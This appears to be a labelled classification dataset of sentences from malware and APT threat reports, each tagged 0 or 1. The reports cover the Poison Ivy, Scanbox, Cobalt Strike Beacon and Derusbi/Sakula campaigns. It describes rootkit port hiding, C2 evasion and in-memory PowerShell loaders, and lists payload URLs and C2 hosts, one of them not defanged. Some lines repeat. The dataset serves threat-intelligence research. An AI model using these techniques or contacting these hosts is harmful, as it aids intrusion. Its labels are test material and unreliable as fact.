framework be present on the victim machine .	0
The tool appears to have been compiled on Thursday May 26th , 2011 at 10:21:44 A.M. UTC ( early evening time in China ) .	0
The sample utilizes the AES cryptographic algorithm to protect its C2 communications .	1
This DLL is a moderately sophisticated backdoor with several well designed communication mechanisms not typically seen in these types of implants .	1
The code base for the sample was developed in C++ .	0
The code appears to have been compiled on Sunday October 30 , 2011 at 12:43:33 P.M. UTC ( late evening time in China ) .	0
This sample has multiple communication capabilities available that makes it far more versatile and stealthy .	1
It implements relatively well thought out protocols including HTTP and DNS .	1
The tool has the ability to automatically down select the most effective communication channel once it has been instantiated , which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement .	1
The DLL itself contains traces of the original C++ class names that were utilized in the source code , which in general were prefixed with 'PCC ' .	0
The sample supports the ability to act as a generic proxy , this may be intended to proxy C2 traffic for other infected machines in order to minimize the number of systems communicating to the C2 , thus enhancing OPSEC .	1
The sample contains 'dead code ' which appears to be command and control server classes , this is likely an indicator that the C2 client which would communicate with this sample shares the same communications library which was compiled into this sample .	1
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the CCRootkit package publicly by Steven Lai ( a/k/a embedlinux ) .	1
This kernel mode rootkit implements several hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL .	1
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the source code Steven Lai posted .	0
This driver attempts to hide a wide swath of TCP ports ( 40000-45000 ) for an unknown reason , however it is suspected that this may relate to the potential network relaying capability alluded to for the backdoor dll .	1
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the CCRootkit package publicly by Steven Lai ( a/k/a embedlinux ) .	1
This kernel mode rootkit implements several hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL .	1
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the source code Steven Lai posted .	0
This driver attempts to hide a wide swath of TCP ports ( 40000-45000 ) for an unknown reason , however it is suspected that this may relate to the potential network relaying capability alluded to for the backdoor dll .	1
Implemented values for cmdID are as follows : cmdType can be one of the following ( Interesting commands explained in detail ) : string0 can have one of the following values dependant upon command id and type .	0
cardmagic writes : Windows Vista has changed alot on network module , many old port hiding materials are no longer usable .	0
In this post , I will share with you a simple code to hide port under Vista , hope it is useful for some guys .	0
Actually under Windows Vista , netstat.exe will call InternalGetTcpTable2 which is exported by Iphlpapi.dll to list all open ports , then InternalGetTcpTable2 will transfer control to NsiAllocateAndGetTable which is exported by nsi.dll , and finally nsi.dll involve NsiEnumerateObjectsAllParametersEx to interact with kernel mode module of NSI -- nsiproxy.sys .	0
nsiproxy.sys is almost like a wrapper of netio.sys , it will then call internal subroutines of netio.sys .	0
Here , we will use a relatively easy way -- '' NSI Kernel Module Dispatch Routine Hook '' to demonstrate the specified port hiding uner Vista .	0
Dispatch routine hook is an old topic , this time , we will apply this method to nsiproxy.sys .	0
On September 24 2014 , FireEye observed a new strategic web compromise ( SWC ) campaign that we believe is targeting non-profit organizations and non-governmental organizations ( NGO ) by hosting iframes on legitimate websites .	0
The compromised websites contained an iframe to direct site visitors to a threat actor-controlled IP address that dropped a Poison Ivy remote access tool ( RAT ) onto victims ' systems .	1
FireEye has not yet attributed this activity though we have identified links to the Sunshop Digital Quartermaster , a collective of malware authors that supports multiple China-based advanced persistent threat ( APT ) groups .	0
FireEye previously established detection measures for this threat activity , ensuring our clients were prepared for these intrusion attempts well in advance of threat actor implementation .	0
On September 24 , FireEye observed SWCs , likely conducted by a unitary threat group based on shared infrastructure and tools , on at least three different websites : an international non-profit organization that focuses on environmental advocacy , and two different NGOs that promote democracy and human rights .	0
The group was able to compromise these websites and insert malicious iframes .	1
Figure 1 displays one of the iframes .	0
The threat group obfuscated the iframe on two of the compromised websites .	1
The iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45 .	1
In turn , these exploits downloaded and decoded a payload hosted at : hxxp : //103.27.108.45/img/js.php .	1
A GET request to this URI returned the following content : The 'bin ' param shown in Figure 2 is decoded from ASCII into hex by the Java exploit .	0
Once decoded , FireEye identified the payload as a Poison Ivy variant .	0
It had the following properties : The backdoor also contained the below versioning info embedded in the RTVERSION of one of the PE resources : This versioning info attempted to masquerade as a Google Chrome file .	1
However , the malware author misspelled multiple words when attempting to put in versioning information for this particular build .	0
The Poison Ivy implant had the following configuration properties : The C2 domain quakegoogle.servequake [ . ] com resolved to 115.126.62.100 at the time of the SWCs .	1
Other domains resolving to the same IP include the following : Between August 30 , 2014 and September 16 , 2014 we also observed SOGU ( aka Kaba ) callback traffic sent to assign.ddnsking.com over port 443 .	1
The Poison Ivy backdoor also had a RTMANIFEST PE resource with a SHA256 fingerprint of 82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393 .	0
This same RTMANIFEST resource was documented in our previous Sunshop Digital Quartermaster report .	0
FireEye previously identified this specific RTMANIFEST as the 'Sunshop Manifest , ' and we have observed this same manifest resource used in 86 other samples .	0
As we stated in the Quartermaster report , we believe this shared resource is an artifact of a builder toolkit made available to a number of China- based APT groups .	0
This activity represents a new SWC campaign .	0
We suspect threat actors are leveraging their access to compromised websites belonging to NGOs and non-profits to target other organizations in the same industries .	0
These websites are often visited by organization employees and other organizations in the same industries , allowing threat actors to move laterally within already compromised networks or gain access to new networks .	0
While FireEye has not attributed this activity to a specific threat group , we frequently observe China-based threat actors target non-profits and NGOs , and we suspect that they seek to monitor activity within their borders that may lead to domestic unrest or embarrass the Chinese government .	0
For example , in 2013 , FireEye observed China-based threat actors steal grant applications and activity reports specifically related to an international NGO 's China-based activities .	0
We suspects threat actors sought to monitor these programs and involved individuals .	0
The three organizations whose websites are hosting the malicious iframes have China-based operations .	0
FireEye is releasing information on this campaign to allow organizations to investigate and prepare for this activity in their networks .	0
We believe non-profits and NGOs remain at elevated risk of intrusion and should be especially wary of attempts to compromise their networks using SWC .	0
Threat actors may use SWCs to achieve this goal , but FireEye does not discount the possibility that threat actors will use other means at their disposal , including phishing .	0
Based on past threat actor activity in this industry , FireEye expects threat actors are motivated to steal programmatic data and monitor organizations ' programs in specific countries .	0
If China-based threat actors are behind the observed campaign , FireEye expects that organizations with operations in China are high-priority targets .	0
FireEye currently has detection measures in place that should allow users of FireEye products to detect this SWC activity .	0
It is also likely that other industries or organizations were affected by this SWC activity , since these sites are public facing and frequently visited .	0
Special thanks to Google 's Billy Leonard for providing additional information and research .	0
Thanks to the following authors for their contributions : Mike Oppenheim , Ned Moran , and Steve Stone .	0
This entry was posted in Threat Intelligence , Threat Research by Sarah Engle and Ben Withnell .	0
Bookmark the permalink .	0
A few days ago we detected a watering hole campaign in a website owned by one big industrial company .	0
The website is related to software used for simulation and system engineering in a wide range of industries , including automotive , aerospace , and manufacturing .	0
The attackers were able to compromise the website and include code that loaded a malicious Javascript file from a remote server .	1
This Javascript file is a framework for reconnaissance that the attackers call '' Scanbox '' and includes some of the techniques we described in a previous blog post : The Scanbox framework first configures the remote C & C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including : Resulting in something like this : Before sending the information to the C & C server , Scanbox encodes and encrypts the data with the following function : Producing the following request : If we decrypt the data it translates to : After the first request , the framework contains several plugins to extract different information from the victim .	1
While the user is browsing the compromised website , all keystrokes are being recorded and sent to the C & C periodically .	1
It will also send keystrokes when the user submits web forms that can potentially include passwords and other sensitive data .	1
As we have seen , this is a very powerful framework that gives attackers a lot of insight into the potential targets that will help them launching future attacks against them .	0
We have also seen several Metasploit-produced exploits that target different versions of Java in the same IP address that hosts the Scanbox framework ( 122.10.9 [ .	0
] 109 ) .	0
Recently , ANTIY Labs detected an APT attack targeting some government agency in China .	0
The Shellcode for communication is conducted depending on Beacon mode which is generated on the basis of automatic attack detection platform - Cobalt Strike .	0
This kind of attack pattern disguising as non - malicious real file in the host of its target , it sending a network heartbeat package every 60 seconds , and it also send data information via the Cookie field , all these features of this attack pattern are designed to evade the detection of security software and the interception of firewall on the targeted host .	1
Considering the relationship between this attack and Cobalt Strike platform , we name it as APT - TOCS ( TOCS refers to Threat on Cobalt Strike . ) for now .	0
The core step of APT - TOCS is downloading the script functionalities of Shellcode , which downloads a field of data into memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is generated by Cobalt Strike ( An automatic attack testing platform ) .	1
After loading the script of Shellcode , the Analysis Group of ANTIY did a series of correlation analysis , then we found a PE program that maybe act as a guiding executable file in similar attacks .	0
The loaded Shellcode script can be used to call command line to add a certain field of encrypted date into memory and run it .	0
The decrypted date turns out to be executable Shellcode which is generated by Cobalt Strike .	0
The related script can be loaded via the guiding PE program or vulnerability .	0
This kind of attack pattern has several features which including running in memory , no hard disk writing operations , communicating via Beacon , multi - beacon communication is acceptable , and several Beacons can work simultaneously .	0
Such attack can be launched without the support of vector file , in fact it depends on network projection and laterally move in the internal network as required conducting an attack .	0
So , it will bring great difficulties to the forensic work .	0
It is important to note that , all the Sandboxes we know are disabling to fight against this kind of attack .	0
It seems that the attack capability of APT - TOCS is close to that of APT - level .	0
However , it relied on automatic attack testing platform instead of abilities of the attack team .	0
2.1 Leading files and sample downloading APT - TOCS used " powershell.exe " to execute Shellcode scripts to realize remote control on targeted system .	1
The analysts of Antiy thought that the attacker might know several remote injection methods of script downloading privilege , such as directly making the scrip be executed on the host by using security vulnerabilities .	0
Meanwhile , we found the following binary leading attack files ( hereinafter referred to as Sample A ) were used in similar attacks before .	0
2.2 Key mechanism The core part of APT - TOCS relies on the encrypted data scripts ( hereinafter referred to as Sample B ) downloaded by PowerShell .	0
Figure 1 consists of various derivation relationships and major module functionalities .	0
2.3 Analysis on the major sample ( Sample B ) of APT - TOCS The content ( Here omitted the content of base64 . ) of Sample B is as follows .	0
The functionality of this part of script is : decrypting the encrypted content of base64 , decompressing with Gzip , resulting in module 1 and using PowerShell to download and execute .	0
2.4 Analysis on script 1 The content of script 1 is as follows .	0
The functionality of this part is : decrypting data with base64 encryption and getting module 1 , then writing to process powershell.exe , and executing and operating .	1
2.5 Analysis on module 1 The functionality of this module is as follows : calling the function of wininet module , connecting the network , downloading operations of module 2 ; and executing by downloading to the memory .	0
Figure 6 shows that using request of HTTP GET to get file : http://146.0.43.107/hfYn .	0
2.6 Analysis on module 2 Module 2 established and listed system process rundll32.exe .	0
Data that has been written into module 3 .	0
Though the data of module 3 started with " MZ " , it does not belong to PE files .	0
Instead , it is the Shellcode with backdoor functionality .	0
2.7 Analysis on module 3 The module might connect the following 2 addresses with port 80 .	0
 146.0.***. * * * ( Romania )  dc.******69.info ( 146.0.***. * * * ) ( Romania ) Sending request data and receiving return data .	0
The decryption to above IP , domains and accessing addresses is " XOR 0x69 " .	0
Judging from the module strings and the system functions , the module belongs to backdoor program that can send GET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds ' interval .	1
The heartbeat package data includes : check code , process ID , system version , IP address , computer name , account , whether it is 64 bit process .	0
Then it transmits by making use of both RSA and BASE64 encryption .	0
Analysis on APT - to - be Attack That Focusing on China 's Government Agency As the process ID and check code are different , the transmitted heartbeat package data are different each time .	0
The check code is calculated through using process ID and the millisecond process during system startup .	0
The algorithm is as follows .	0
The encrypted heartbeat package used Cookie field to transmit .	0
3 The authentication analysis on the technology sources of this attack The leading PE files , Sample_A and Sample B , associated by analysts of Antiy CERT used the exactly same method of PowerShell .	0
However , we can not eliminate the possibility that Sample_A has no positive connection with this attack due to the high standardization of relevant scripts .	0
We still consider it as a series of attack incidents based on other comprehensive analysis .	0
The attacker might exploit the following ways to control the target host , such as social engineering e - mails , file bundling , exploiting system and application vulneratbilities , lateral movement of intranet and so on .	0
We found " Beacon " strings when analyzing " Module 1 " .	0
According to existed experience , we doubted that Shellcode is closely related with automatic attack testing platform Cobalt Strike .	0
Therefore , our analysts carried out comparison analysis on Beacon generated by Cobalt Strike , and authenticated the relationships between them .	0
Cobalt Strike is the GUI framework penetration tool based on metasploit .	0
The business version of it integrates the following characteristics : service scan , automatic overflow , multi - mode port espionage , various Trojan generation , phishing attack , site clone , target information obtaining , automatic browser attack and so on .	0
3.1 Comparison of Module 1 We compared module 1 and the payload generated by using Beacon , and found only the following different data : the Head data , request file name and IP address .	0
The left is sample module 1 , while the right is the module generated by Beacon .	0
We can lead to the conclusion from the comparison : module 1 is generated by Beacon .	0
The screenshot of data package in request is as follows .	0
3.2 Comparison of disassembling commands of module 2 Our analysts compared sample module 2 and relevant files of Beacon , and found that the disassembling commands between them are exactly the same with exception of functionality code , including XOR encryption at the entry , downloading system DLL , obtaining function address , function calling modes and so on .	0
The following lists three points .	0
3.3 Comparison analysis on module 3 data package The following figure is the GET request comparison of the module generated by sample module 3 and Beacon .	0
Here we can see both of them use Cookie to transmit that has been encrypted , and send requests actively every 60 seconds .	1
The data package is heartbeat .	1
3.4 Characteristics of Cobalt Strike Using Cobalt Strike attack can execute various operations in the targeted systems , such as downloading and uploading files , executing designated programs , injecting keyboard recorder , executing commands via PowerShell , importing PowerShell script , executing commands via CMD , accessing system passwords and so on .	1
Cobalt Strike has the following characteristics .	0
With an automated test platform Cobalt Strike , the attack penetration can penetrate firewall , the approach the attackers used to control targeted host is covert and undetectable ; what 's more , it can attack various platforms , such as Windows , Linux , Mac etc . ; it 's formidable adversary to Trusted Computing , Cloud Detection , Sandbox Detection and so on .	1
According to the traces in the past , we believe that the threat has been active for 5 years ; unfortunately , there is n't any powerful detection production and methods to defeat the malicious attack till now .	0
The reason why the CERT Analysis Team of ANTIY classified APT - TOCS into APT incidents is that it 's a kind of targeted attack ( one of the features of APT attack ) , it has anti - detection functions and also it can conceal itself .	1
Compared with APT incidents in the past , the APT attack in this case does n't cost too much , and the attackers are n't responsible for coding .	0
With the application of commercial attack platform , the attackers saved the cost of an attack , also the vulnerability built joint function provided by relevant attack platform make the attackers easy to do injection .	0
As a result , nations and organizations which without its own elite hacker groups and abundant capital can also launch some kind of APT attack via the attack pattern mentioned in this case .	0
Meanwhile , it 's more difficult for us to tracing when facing such modeled attack .	0
One of the leaders in Information Security area - Bruce Schiner said , " when big events on information security happened , people tend to treat it as an example of cyber warfare .	0
It 's ridiculous .	0
From my point of view , what 's happening and going to happen is : more and more tactics in physical warfare are applied to cyber warfare .	0
It 's important to note that , attack capabilities can be widely distributed if attackers take full advantages of certain technology , especially computer technology can make attack more powerful and automated . " Obviously , highly automated commercial platform realized a high speed of spread of this attack capability ( exceeded our anticipation ) .	0
We have to remind all relevant parties that we are confronting with the risk of large scale diffusion of network armaments which is led by the low cost of the attack capability .	0
The commercial penetration attack detecting platform has two sides , on one hand , it can check the network environment of systems effectively , on the other hand , for nations , organizations and industries which has limited budget , it costs too much .	0
Given the situation , all related parties should conduct more communication with each other , additionally , there is no doubt that both offensive party and defensive party are supported by superpowers , these superpowers should prevent the attack technique from widely distributing .	0
The incident mentioned there has no difference with other cases we detected in the past , it shows that , on the way to realize national informatizaion , we must fight against serious security challenges as we confronting now ; it 's also a good opportunity for our Chinese people and enterprises to demonstrate our faith and the efforts we made to conquer the challenge .	0
Cobalt Strike is the business version of Armitage which is the penetration testing software of Metasploit figure interface written by Java .	0
Armitage can carry out automatic attacks by combining with known exploits of Metasploit .	0
It integrates the free version of Armitage under bt5 and kali linx , and the most powerful functionality is adding the Payload of Beacon .	0
The first release time of Cobalt Strike is June , 2012 .	0
Author of Cobalt Strike : Raphael Mudge Raphael Mudge is the founder of Strategic Cyber LLC , a Washington , DC based company that creates software for red teams .	0
He created Armitage for Metasploit , the Sleep programming language , and the IRC client jIRCii .	0
Previously , Raphael worked as a security researcher for the US Air Force , a penetration tester , and he even invented a grammar checker that was sold to Automattic .	0
His work has appeared in Hakin9 , USENIX ; login : , Dr.	0
Dobb 's Journal , on the cover of the Linux Journal , and the Fox sitcom Breaking In .	0
Raphael regularly speaks on security topics and provides red team support to many cyber defense competitions .	0
Education background : Syracuse University , Michigan Technological University Current position : Strategic Cyber LLC , Delaware Air National Guard Skills : software development , information security , object - oriented design , distributed system , figure interface , computer network design , blog system , social engineering , security research and so on .	0
Supported organizations .	0
Collegiate Cyber Defense Competition ( CCDC ) North East CCDC 2008 - 2015 Mid Atlantic CCDC 2011 - 2015 Pacific Rim CCDC 2012 , 2014 South East CCDC - 2014 Western Regional CCDC - 2013 National CCDC 2012 - 2014 Projects .	0
Published works .	0
The Design of a Proofreading Software Service Agent - based Traffic Generation Contribution .	0
Projects .	0
Reference linking .	0
https://plus.google.com/116899857642591292745/posts （google+） https://github.com/rsmudge ( GitHub ) https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw ( youtube ) http://www.oldschoolirc.com/ https://twitter.com/rsmudge http://www.hick.org/~raffi/index.html http://www.blackhat.com/html/bh-us-12/speakers/Raphael-Mudge.html http://www.linkedin.com/in/rsmudge Antiy Labs is a professional next - generation security - testing engine R&D enterprise .	0
Antiy 's engines provide the ability to detect various viruses and malware for network security products and mobile devices , which are used by more than ten well known security vendors .	0
Antiy 's engines are embedded in tens of thousands of firewalls and tens of millions of mobile phones all over the world .	0
Antiy Labs is awarded the " Best Protection " prize by AV - TEST in 2013 .	0
Based on engines , sandboxes and background systems , Antiy Labs will continue to provide traffic - based anti - APT solutions for enterprises .	0
More information about antivirus engine , http://www.antiy.com ( Chinese ) http://www.antiy.net ( English ) More information about anti - APT products of http://www.antiy.cn Antiy ,	0
Posted February 27 , 2015 by ThreatConnect Intelligence Research Team ( TCIRT)[1 ] �led under Threat Research[2 ] .	0
UPDATE : Premera Latest Healthcare Insurance Agency to be Breached[3 ] When news of the Anthem breach was reported on February 4th , 2015 , the security industry quite understandably went wild .	0
A breach of this magnitude was certainly unprecedented .	0
Naturally , many industry professionals were keenly interested in digging into this incident to see what could be uncovered , and the research team at ThreatConnect was no exception .	0
Thanks to our powerful API[4 ] and third - party partner[5 ] integrations , we were able to use ThreatConnect to quickly uncover a wealth of intelligence even when initially hindered by a relative lack of investigative lead information and context , a key requirement of any Threat Intelligence Platform[6 ] ( TIP ) .	0
However , before we delve into what we were able to uncover , let 's brie�y review the facts as they stood in the wake of the initial discovery announcement .	0
On the morning of February 4th , 2015 , several major news outlets broke the story[7 ] that Anthem , Inc. 's network defenses had been breached .	0
According to a statement from Anthem 's CEO[8 ] , the company fell victim to a " very sophisticated external cyber attack , " and the hackers " obtained " the personally identi�able information ( PII ) of approximately 80 M customers .	0
This included social security numbers , birthdays , street addresses , phone numbers and income data – plenty of information to enable identity theft .	0
This was a signi�cant event for several reasons .	0
Anthem , formerly known as Wellpoint , is the largest managed healthcare company in the Blue Cross Blue Shield Association , and by extension , one of the largest healthcare organizations in the United States .	0
As such , any compromise , no matter how insigni�cant , would likely impact countless individuals .	0
Blue Cross Blue Shield provides healthcare coverage for about half the U.S.	0
federal workforce .	0
This means that their information was potentially compromised too .	0
Unlike the Sony hack which was destructive in nature and meant to send a message for coercive purposes , the Anthem compromise was purportedly very covert , a fact which may suggest something about the adversary 's motives .	0
As of late February 2015 , there have not been any indications that the ex�ltrated PII data was immediately commoditized on the black market for the purpose of enabling identity theft , as was the case in the Home Depot Breach .	0
Obviously , these high - level observations do not provide cybersecurity researchers a great deal of information to work with .	0
However , when presented within the context of a Threat Intelligence Platform ( TIP ) , an incomplete trail of evidence can highlight intelligence gaps , a study of which can orient threat researchers towards their analytic objectives .	0
To this end , let 's examine what we wanted to discover in the context of the Anthem breach : Who was responsible for the attack ? What was the objective of the attack ? Was it cyber theft , an espionage operation , or something different ? Who was targeted in the attack ? The answer to this question , obscured as it may be , would likely shed some light on the objective of the breach .	0
What was the timeline of the activity ? The real power of a Threat Intelligence Platform is demonstrated when you are able to collect and maintain a robust dataset of threat indicators , both past and present , which can help orient you in the right direction in the wake of a newly discovered breach .	0
Even when you do not have a good deal of information to start with ( for example a �le hash , or an IP address ) , you may �nd leads by pivoting through archived datasets until you uncover key pieces of the puzzle .	0
In the case of the Anthem breach , we were able to do just that .	0
In September 2014 , the ThreatConnect Intelligence Research Team ( TCIRT)[9 ] observed a variant of the Derusbi APT malware family , MD5 : 0A9545F9FC7A6D8596CF07A59F400FD3[10 ] , which was signed by a valid digital signature from the Korean company DTOPTOOLZ Co.	0
Derusbi is a family of malware used by multiple actor groups but associated exclusively with Chinese APT .	0
TCIRT began tracking the DTOPTOOLZ signature for additional signed malware samples and memorialized them within our Threat Intelligence Platform over time .	0
Analyst Comment : The DTOPTOOLZ signature has also been observed in association with Korean Adware that is af�liated with the actual DTOPTOOLZ Co.	0
This adware should not be confused with the APT malware that is abusing the same digital signature .	0
Later , in mid - November we discovered another implant that was digitally signed with the DTOPTOOLZ signature .	0
This implant , MD5 : 98721c78dfbf8a45d152a888c804427c[11 ] , was from the " Sakula " ( aka .	0
Sakurel ) family of malware , a known variant of the Derusbi backdoor , and was con�gured to communicate with the malicious command and control ( C2 ) domains extcitrix.we11point[.]com and www.we11point[.]com .	0
Through our Farsight Security passive DNS[12 ] integration , we uncovered that this malicious infrastructure was likely named in such a way to impersonate the legitimate Wellpoint IT infrastructure .	0
Passive DNS and historic DomainTools Whois data also provided insights that helped establish an initial timeline dating back to April 2014 , when the faux domains came into existence and were later operationalized by the attackers .	0
A Threat Intelligence Platform should allow for analysts to easily put together and organize such insights , collaborate around relevant analysis internally , and share the �nished analysis with external industry groups and organizations .	0
In the hopes that our community members could bene�t from or provide further insight into this suspicious incident , we immediately shared our threat intelligence including indicators , signatures and analytical context to the ThreatConnect Medical and Health Community[13 ] on November 13 , 2014 .	0
This included sending out a noti�cation to all stakeholders as well as our followers on Twitter[14 ] .	0
When the Anthem breach later came to light in early February , we re - shared the signatures , indicators and context freely to the entire ThreatConnect user base .	0
As we dug further , we expanded our understanding of the malicious we11point[.]com infrastructure , taking particular interest to the subdomains such as " extcitrix.we11point[.]com and " hrsolutions.we11point[.]com " .	0
Note the " citrix " and " hr " ( human resources ) pre�xes that the adversary used to mirror legitimate remote infrastructure and employee bene�ts resources in the May 2014 timeframe .	0
This provided initial insights as to the likely targeting themes and or vectors in which the adversary may have used when initiating their targeting campaign .	0
[ 15 ] The fact that the malicious infrastructure closely mirrored other legitimate Wellpoint infrastructure supported our hypothesis that the Derusbi / Sakula malware was con�gured to operate and persist within a speci�c target enterprise .	0
Retrospective analysis of other targeted malware samples using the DTOPTOOLZ Co.	0
digital signature led to the identi�cation of an " HttpBrowser " / " HttpDump " implant MD5 : 02FAB24461956458D70AEED1A028EB9C[17 ] ( OpenOf�cePlugin.exe ) , which was �rst observed on December 11 , 2013 .	0
Although this malware sample is not Derusbi / Sakula , it too is strongly believed to be associated with Chinese APT activity and in fact may have also been involved in a Blue Cross Blue Shield targeting campaign as early as December 2013 .	0
This particular binary is con�gured to connect to the static IP address 142.91.76[.]134 .	0
Passive DNS of this IP indicates that on December 11th , 2013 , the same date as the malware sample was observed , the domain prennera[.]com also resolved to 142.91.76[.]134 .	0
It is believed that the prennera[.]com domain may have been impersonating the Healthcare provider Premera Blue Cross[19 ] , where the attackers used the same character replacement technique by replacing the " m " with two " n " characters within the faux domain , the same technique that would be seen �ve months later with the we11point[.]com command and control infrastructure .	0
Section Summary : The Derusbi / Sakula malware implant types are unique in that they have traditionally been seen within Chinese APT espionage campaigns .	0
The " HttpBrowser " / " HttpDump " malware implant ( while a different family of malware than Derusbi / Sakula ) is also believed to be of Chinese origin , and was also digitally signed with the DTOPTOOLZ digitalsignature .	0
This implant connected to a C2 node that overlapped with prennera[.]com .	1
We believe that the prennera[.]com domain may be impersonating Premera Blue Cross ( premera.com ) , using a similar character replacement technique seen in the we11point[.]com campaign .	0
Another powerful attribute of ThreatConnect is the ability for analysts to logically group items such as atomic indicators , related documents or signatures , all of which may include individualized custom context enrichments and associations .	0
Over time , the ability to memorialize groupings of related or like activity allows analysts to quickly uncover non - obvious relationships within their private datasets .	0
This is exactly what happened as we continued to investigate these incidents .	0
As industry analysts and media speculated Chinese APT involvement[20 ] in the Anthem breach , our focus into the Derusbi / Sakula malware signed with the DTOPTOOLZ Co.	0
digital signature shifted from the we11point[.]com incident to another cluster of activity that occurred later in May 2014 .	0
We immediately reviewed Incident 20140526B : vaeit APT[21 ] , an incident that we initially shared to our Subscriber Community on September 29 , 2014 after conducting retrospective analysis .	0
[ 22 ] Just as was the case with the we11point[.]com and prennera[.]com incidents , the VAE , Inc.	0
incident is also believed to be associated with Chinese APT espionage activity .	0
In this case the adversary also used Derusbi / Sakula malware that was signed with the DTOPTOOLZ Co.	0
digital signature and con�gured to communicate with faux infrastructure appearing to be masquerading as internal resources for the Department of Defense Contractor VAE , Inc.	0
Additionally , in response to an inquiry from KrebsOnSecurity , VAE , Inc.	0
would later con�rm[24 ] that it had indeed been a target of a failed spearphishing attempt in May 2014 which used the malicious faux VAE , Inc.	0
themed domain .	0
The targeted incident relied upon the Sakula executable MD5 : 230D8A7A60A07DF28A291B13DDF3351F[25 ] which had a XOR 0x9A encoded C2 callbacks to the IP address 192.199.254[.]126 ( registered to Wehostwebsites[.]com – " Tom Yu " of Baoan , Shenzhen City , Guangdong Province , China ) as well as a hardcoded callback to sharepoint - vaeit[.]com .	0
Passive DNS of the static C2 IP 192.199.254[.]126 revealed a single suspicious domain of interest – topsec2014[.]com .	0
This domain had historic resolution around May 8 , 2014 within a month of the �rst observed Sakula activity using the IP 192.199.254[.]126 as C2 .	0
[ 26 ] [ 27 ] Using historic Whois , we discovered that topsec2014[.]com was initially registered by li2384826402@yahoo[.]com on May 6th , 2014 .	0
Although the li2384826402@yahoo[.]com registrant is likely a reseller given that it has been observed registering several thousands of other domains , the fact that it was used to register both the faux VAE , Inc.	0
C2 infrastructure and the overlapping domain topsec2014[.]com within the same month suggests that there may be a relationship between the client of the reseller for the VAE , Inc.	0
infrastructure and the client for topsec2014[.]com .	0
[ 28 ] [ 29 ] Just four minutes after the initial registration of topsec2014[.]com , the Whois records were updated from the initial registrant , Li Ning – li2384826402@yahoo[.]com to TopSec China – TopSec_2014@163[.]com .	0
This domain record has been unchanged since May 7th 2014 .	0
The we11point[.]com infrastructure and by extension the faux VAE Inc.	0
infrastructure is associated with Cluster 2 of the ScanBox framework[30 ] by PwC.	0
The latest PwC update to ScanBox states that there are " links between the domain allegedly used in the Anthem hack ( we11point.com ) to Cluster 2 through shared WHOIS details . " < setion > One notable pattern was how the domain Whois registration information for the VAE , Inc.	0
themed infrastructure was quickly updated and obfuscated with pseudorandom 10 character gmx.com email addresses and using the names of various comic book characters from the Iron Man franchise .	0
This comic - themed naming convention has been previously documented by our friends at Crowdstrike[31 ] in what they characterize as being associated with a Chinese APT group they have dubbed " Deep Panda " .	0
Leveraging our DomainTools partnership , we were able to correlate the outlier domain opm - learning[.]org .	0
This domain was also purportedly registered by the Iron Man movie hero " Tony Stark " on July 28 , 2014 .	0
This infrastructure naming convention suggests a possible Of�ce of Personnel Management ( OPM ) theme .	0
However , in this case we lacked any speci�c sample of malware to verify our initial suspicions that this infrastructure was operational .	0
The possible OPM reference in the domain name is noteworthy considering it was revealed in July of 2014 that OPM had been compromised[32 ] by a likely state - sponsored Chinese actor in mid - March of that year .	0
The fact this domain was registered after the breach occurred suggests that OPM could be an ongoing direct target of Chinese state - sponsored cyber espionage activity .	0
Our attention then turned to the FBI Flash Report A-000049- MW[33 ] that was publicly reported by Brian Krebs [ 34]on February 6th , 2015 .	0
This FBI Flash Report was issued on January 27th , 2015 , the same day an Anthem administrator detected suspicious activity according to an internal memo[35 ] .	0
This memo goes on to indicate that the FBI would not be party to the Anthem breach until they were noti�ed on January 29th , 2015 ; based on these facts we assess with high con�dence that it is very unlikely that the FBI Flash Report was directly related to the Anthem breach .	0
Rather , we suspect that the FBI �ash report likely references the USIS breach that was announced[36 ] on August 6 , 2014 , or the previous OPM breach , considering the statement that the breach involved " compromised and stolen sensitive business information and Personally Identi�able Information ( PII ) from US commercial and government networks through cyber espionage . " The malware referenced within the FBI Report is associated with a Derusbi backdoor subvariant named " InfoAdmin " / " Kakfum " where the FBI speci�cally references open source reporting of " Deep Panda " as being related to the malware observed in the attack .	0
The malicious infrastructure highlighted in the report are the domains images.googlewebcache[.]com and smtp.outlookssl[.]com .	0
Both of these top level domains were included with other related domains , all of which were shared on September 16th , 2013 to the ThreatConnect Subscriber Community in Incident 20130823C : Some . Trouble APT Domains[37 ] , roughly a year and half prior to the FBI Flash report .	0
It is important to mention that both the domains images.googlewebcache[.]com and smtp.outlookssl[.]comas were also previously identi�ed in an October 2014 PwC blog post[38 ] as seen within Cluster 1 of the Scanbox framework , while the Sakula activity with we11point and VAEIT is contained within Cluster 2 of that report .	0
This implies that the actor referenced within the FBI Flash report uses shared capabilities ( in this case the ScanBox kit ) with the Sakula / we11point actor .	0
Section Summary : The Derusbi / Sakula malware seen in both the we11point[.]com and VAE Inc.	0
campaigns were structurally the same and digitally signed with the DTOPTOOLZ signature .	0
The emerging theme is that this particular signature and family of malware is highly indicative of a particular Chinese APT activity .	0
Within this web of malicious infrastructure , there is an interesting overlap with the topsec2014[.]com domain and attack infrastructure .	0
TCIRT identi�ed a domain opm - learning[.]org that had a similar superhero themed WHOIS registrant to the Sakula / VAE Inc.	0
infrastructure .	0
The possible OPM reference is noteworthy considering the Of�ce of Personnel Management ( OPM ) was compromised in March 2014 .	0
Additionally , an FBI Flash Report 0000 - 49MW referenced indicators that were possibly associated with the USIS hack and a Derusbi variant called " Kakfum " / " InfoAdmin " .	0
Both the FBI Flash infrastructure and the Sakula / VAE Inc.	0
infrastructure are tied to the capability usage of the ScanBox framework , residing in Clusters 1 and 2 respectively .	0
The Professor We conducted open source research in pursuit of further information on the TopSec_2014@163[.]com email registrant .	0
A keyword search returned several results for " topsec2014@163[.]com " in association with a number of academic institutions in Nanjing , China .	0
Although the email address was n't an exact match to the topsec2014[.]com domain registrant ( notice the absence of the underscore ) , such a similarity warranted further investigation .	0
